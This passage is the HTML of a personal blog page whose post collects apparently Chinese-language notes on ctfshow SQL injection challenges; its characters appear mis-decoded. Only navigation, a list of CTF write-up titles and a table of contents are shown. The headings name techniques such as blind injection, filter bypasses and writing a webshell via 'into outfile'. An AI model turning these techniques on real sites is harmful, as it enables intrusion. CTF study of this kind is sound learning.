<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ctfshow-sqlæ³¨å…¥ | MIXBP</title>
  <meta name="keywords" content=" sqlæ³¨å…¥ , å­¦ä¹ ç¬”è®° ">
  <meta name="description" content="ctfshow-sqlæ³¨å…¥ | MIXBP">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="ctfshow-phpååºåˆ—åŒ–web-254å…ˆçœ‹é¢˜ç›®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow-phpåºåˆ—åŒ–">
<meta property="og:url" content="https://mixbp.github.io/master/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="MIXBP">
<meta property="og:description" content="ctfshow-phpååºåˆ—åŒ–web-254å…ˆçœ‹é¢˜ç›®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png">
<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png">
<meta property="article:published_time" content="2025-03-14T14:11:16.000Z">
<meta property="article:modified_time" content="2025-03-16T09:12:50.376Z">
<meta property="article:author" content="MIXBP">
<meta property="article:tag" content="å­¦ä¹ ç¬”è®°">
<meta property="article:tag" content="phpååºåˆ—åŒ–">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 7.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>MIXBP</span>
</div>

<div class="icon">
    
        
            <a title="github"
               href="https://mixbp.github.io/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="email"
               href="mailto:2439254357@qq.com"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-email"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="qq"
               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-qq"></use>
                    </svg>
                
            </a>
        
    
</div>



    <a class="more-menus">æ›´å¤šèœå•</a>



<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(35)</small>
            
        </div>
    </li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
                <a class="dynamic-menu "
                   target="_self"
                   
                   href="https://mixbp.github.io/">MIXBP</a>
        
            
                <a class="dynamic-menu "
                   target="_blank"
                        
                   href="https://mixbp.github.io/">github</a>
        
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="35">
<input type="hidden" id="yelog_site_word_count" value="86.9k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="return"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
            <i class="iconfont icon-tag" data-title="label"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">outline</div>
            <i class="iconfont icon-list" data-title="switch to article list"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æŠ¥é”™æ³¨å…¥</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å †å æ³¨å…¥</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å‘½ä»¤æ‰§è¡Œ</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ—¥å¿—åŒ…å«</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>åˆ·é¢˜ç¬”è®°</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ–‡ä»¶åŒ…å«</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ–‡ä»¶ä¸Šä¼ </a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ä¿¡æ¯æœé›†</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å­¦ä¹ ç¬”è®°</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ­£åˆ™è¡¨è¾¾å¼</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>åšé¢˜ç¬”è®°</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>filterä¼ªåè®®</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>HTML</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>httpåè®®</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>MySQL</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>payloadæ„é€ </a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>php</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>phpååºåˆ—åŒ–</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>PHPååºåˆ—åŒ–æ¼æ´</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>phpç‰¹æ€§</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>python</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sqlæ³¨å…¥</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>wafç»•è¿‡</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xss</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xssæ¼æ´</a>
            </li>
        
    </div>

</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        
        <a  class="All "
           href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
           data-tag="å­¦ä¹ ç¬”è®°,phpååºåˆ—åŒ–"
           data-author="" >
            <span class="post-title" title="ctfshow-phpåºåˆ—åŒ–">ctfshow-phpåºåˆ—åŒ–</span>
            <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/14/GXYCTF2019-BabySQli1/"
           data-tag="åˆ·é¢˜ç¬”è®°,sqlæ³¨å…¥"
           data-author="" >
            <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
            <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
           data-tag="åˆ·é¢˜ç¬”è®°,æ–‡ä»¶åŒ…å«,phpååºåˆ—åŒ–"
           data-author="" >
            <span class="post-title" title="ç½‘é¼æ¯2020é’é¾™ç»„-AreUSerialz1">ç½‘é¼æ¯2020é’é¾™ç»„-AreUSerialz1</span>
            <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
           data-tag="åˆ·é¢˜ç¬”è®°,æ–‡ä»¶åŒ…å«"
           data-author="" >
            <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
            <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/12/RoarCTF2019-EasyCalc1/"
           data-tag="åˆ·é¢˜ç¬”è®°,å‘½ä»¤æ‰§è¡Œ,wafç»•è¿‡"
           data-author="" >
            <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
            <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
           data-tag="åˆ·é¢˜ç¬”è®°,sqlæ³¨å…¥,æŠ¥é”™æ³¨å…¥"
           data-author="" >
            <span class="post-title" title="æå®¢å¤§æŒ‘æˆ˜2019-HardSQL1">æå®¢å¤§æŒ‘æˆ˜2019-HardSQL1</span>
            <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
           data-tag="åˆ·é¢˜ç¬”è®°,sqlæ³¨å…¥,å †å æ³¨å…¥"
           data-author="" >
            <span class="post-title" title="å¼ºç½‘æ¯2019-éšä¾¿æ³¨1">å¼ºç½‘æ¯2019-éšä¾¿æ³¨1</span>
            <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/08/ctfshow-sqli-labs/"
           data-tag="sqlæ³¨å…¥,å­¦ä¹ ç¬”è®°"
           data-author="" >
            <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
            <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
           data-tag="sqlæ³¨å…¥,å­¦ä¹ ç¬”è®°"
           data-author="" >
            <span class="post-title" title="ctfshow-sqlæ³¨å…¥">ctfshow-sqlæ³¨å…¥</span>
            <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/02/php%E7%89%B9%E6%80%A7/"
           data-tag="å­¦ä¹ ç¬”è®°,phpç‰¹æ€§"
           data-author="" >
            <span class="post-title" title="phpç‰¹æ€§">phpç‰¹æ€§</span>
            <span class="post-date" title="2025-03-02 20:14:41">2025/03/02</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/23/ctfshow-xss/"
           data-tag="å­¦ä¹ ç¬”è®°,xss"
           data-author="" >
            <span class="post-title" title="ctfshow-xss">ctfshow-xss</span>
            <span class="post-date" title="2025-02-23 17:12:49">2025/02/23</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
           data-tag="å­¦ä¹ ç¬”è®°,ä¿¡æ¯æœé›†"
           data-author="" >
            <span class="post-title" title="ctfshow-ä¿¡æ¯æœé›†">ctfshow-ä¿¡æ¯æœé›†</span>
            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
           data-tag="å­¦ä¹ ç¬”è®°,å‘½ä»¤æ‰§è¡Œ"
           data-author="" >
            <span class="post-title" title="ctfshow-å‘½ä»¤æ‰§è¡Œ">ctfshow-å‘½ä»¤æ‰§è¡Œ</span>
            <span class="post-date" title="2025-02-17 00:00:48">2025/02/17</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
           data-tag="å­¦ä¹ ç¬”è®°,PHPååºåˆ—åŒ–æ¼æ´"
           data-author="" >
            <span class="post-title" title="PHPååºåˆ—åŒ–">PHPååºåˆ—åŒ–</span>
            <span class="post-date" title="2025-02-14 00:51:53">2025/02/14</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="å­¦ä¹ ç¬”è®°,xssæ¼æ´"
           data-author="" >
            <span class="post-title" title="xssæ¼æ´æ€»ç»“">xssæ¼æ´æ€»ç»“</span>
            <span class="post-date" title="2025-02-12 03:30:15">2025/02/12</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/11/xss-labs/"
           data-tag="å­¦ä¹ ç¬”è®°,xssæ¼æ´"
           data-author="" >
            <span class="post-title" title="xss-labs">xss-labs</span>
            <span class="post-date" title="2025-02-11 23:43:19">2025/02/11</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
           data-tag="å­¦ä¹ ç¬”è®°,linux"
           data-author="" >
            <span class="post-title" title="linuxåŸºç¡€å‘½ä»¤">linuxåŸºç¡€å‘½ä»¤</span>
            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
           data-tag="å­¦ä¹ ç¬”è®°,å‘½ä»¤æ‰§è¡Œ"
           data-author="" >
            <span class="post-title" title="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</span>
            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/ctfshow-web82/"
           data-tag="æ–‡ä»¶åŒ…å«,åšé¢˜ç¬”è®°"
           data-author="" >
            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="å­¦ä¹ ç¬”è®°,æ–‡ä»¶åŒ…å«"
           data-author="" >
            <span class="post-title" title="æ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“">æ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“</span>
            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/26/ctfshow-web160/"
           data-tag="åšé¢˜ç¬”è®°,æ–‡ä»¶ä¸Šä¼ ,æ—¥å¿—åŒ…å«"
           data-author="" >
            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
           data-tag="åšé¢˜ç¬”è®°,æ–‡ä»¶ä¸Šä¼ "
           data-author="" >
            <span class="post-title" title="buuctfæå®¢å¤§æŒ‘æˆ˜upload">buuctfæå®¢å¤§æŒ‘æˆ˜upload</span>
            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/22/upload/"
           data-tag="å­¦ä¹ ç¬”è®°,æ–‡ä»¶ä¸Šä¼ "
           data-author="" >
            <span class="post-title" title="upload">upload</span>
            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="å­¦ä¹ ç¬”è®°,python"
           data-author="" >
            <span class="post-title" title="pythonå­¦ä¹ ç¬”è®°">pythonå­¦ä¹ ç¬”è®°</span>
            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
           data-tag="åˆ·é¢˜ç¬”è®°,httpåè®®"
           data-author="" >
            <span class="post-title" title="æå®¢å¤§æŒ‘æˆ˜2019Http">æå®¢å¤§æŒ‘æˆ˜2019Http</span>
            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
           data-tag="åˆ·é¢˜ç¬”è®°,filterä¼ªåè®®"
           data-author="" >
            <span class="post-title" title="æå®¢å¤§æŒ‘æˆ˜2019SecretFile">æå®¢å¤§æŒ‘æˆ˜2019SecretFile</span>
            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
           data-tag="åˆ·é¢˜ç¬”è®°,sqlæ³¨å…¥"
           data-author="" >
            <span class="post-title" title="æå®¢å¤§æŒ‘æˆ˜2019LoveSQL">æå®¢å¤§æŒ‘æˆ˜2019LoveSQL</span>
            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
           data-tag="åˆ·é¢˜ç¬”è®°,payloadæ„é€ "
           data-author="" >
            <span class="post-title" title="æå®¢å¤§æŒ‘æˆ˜2019Havefun">æå®¢å¤§æŒ‘æˆ˜2019Havefun</span>
            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
           data-tag="åˆ·é¢˜ç¬”è®°,sqlæ³¨å…¥"
           data-author="" >
            <span class="post-title" title="æå®¢å¤§æŒ‘æˆ˜2019EasySQL">æå®¢å¤§æŒ‘æˆ˜2019EasySQL</span>
            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
           data-tag="sqlæ³¨å…¥,å­¦ä¹ ç¬”è®°"
           data-author="" >
            <span class="post-title" title="sqlæ³¨å…¥">sqlæ³¨å…¥</span>
            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/29/MySQL/"
           data-tag="å­¦ä¹ ç¬”è®°,MySQL"
           data-author="" >
            <span class="post-title" title="MySQL">MySQL</span>
            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
           data-tag="å­¦ä¹ ç¬”è®°,æ­£åˆ™è¡¨è¾¾å¼"
           data-author="" >
            <span class="post-title" title="æ­£åˆ™è¡¨è¾¾å¼ç¬”è®°">æ­£åˆ™è¡¨è¾¾å¼ç¬”è®°</span>
            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="å­¦ä¹ ç¬”è®°,php"
           data-author="" >
            <span class="post-title" title="PHPå­¦ä¹ ç¬”è®°">PHPå­¦ä¹ ç¬”è®°</span>
            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="å­¦ä¹ ç¬”è®°,HTML"
           data-author="" >
            <span class="post-title" title="HTMLå­¦ä¹ ç¬”è®°">HTMLå­¦ä¹ ç¬”è®°</span>
            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/welcome/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="welcome">welcome</span>
            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="Toggle full screen shortcut key s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-ctfshow-sqlæ³¨å…¥" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">ctfshow-sqlæ³¨å…¥</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color1">sqlæ³¨å…¥</a>
            
            <a class="color5">å­¦ä¹ ç¬”è®°</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2025-03-12 00:47:12'>2025-03-04 23:42</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:5.1k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views ğŸ‘€ :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="Jump to comment area">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sqlæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-171%EF%BC%88%E6%97%A0%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">web-171ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-172%EF%BC%88%E6%97%A0%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="toc-text">web-172ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ã€unionè”åˆæŸ¥è¯¢ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-173%EF%BC%88%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81hex%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4flag%EF%BC%89"><span class="toc-text">web-173ï¼ˆå­—ç¬¦å‹æ³¨å…¥ã€hexå‡½æ•°ç»•è¿‡æ­£åˆ™è¿‡æ»¤flagï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-174%EF%BC%88%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97%E3%80%81replace%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E3%80%81%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-text">web-174ï¼ˆæ­£åˆ™è¿‡æ»¤æ•°å­—ã€replaceå‡½æ•°ç»•è¿‡ã€ç›²æ³¨ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-175%EF%BC%88%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4ascii-0-127%E7%BB%95%E8%BF%87%E3%80%81%E5%88%A9%E7%94%A8into-outfile%E5%86%99%E5%85%A5webshell%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%EF%BC%89"><span class="toc-text">web-175ï¼ˆæ­£åˆ™è¿‡æ»¤ascii 0-127ç»•è¿‡ã€åˆ©ç”¨into outfileå†™å…¥webshellã€æ—¶é—´ç›²æ³¨ ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-176%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-176ï¼ˆå¤§å°å†™ç»•è¿‡selectè¿‡æ»¤ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-177%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%88-%E3%80%81-09%EF%BC%89%EF%BC%89"><span class="toc-text">web-177ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ&#x2F;**&#x2F;ã€%09ï¼‰ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-178%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%88-0b%E6%8D%A2%E8%A1%8C%E7%AC%A6%E3%80%81-09%EF%BC%89%EF%BC%89"><span class="toc-text">web-178ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ%0bæ¢è¡Œç¬¦ã€%09ï¼‰ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#we-179%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%88-0c%EF%BC%89%EF%BC%89"><span class="toc-text">we-179ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ%0cï¼‰ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-180%EF%BC%88-23-%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-180ï¼ˆ#(%23)æ³¨é‡Šç¬¦è¿‡æ»¤ç»•è¿‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-181%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E3%80%81%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%89"><span 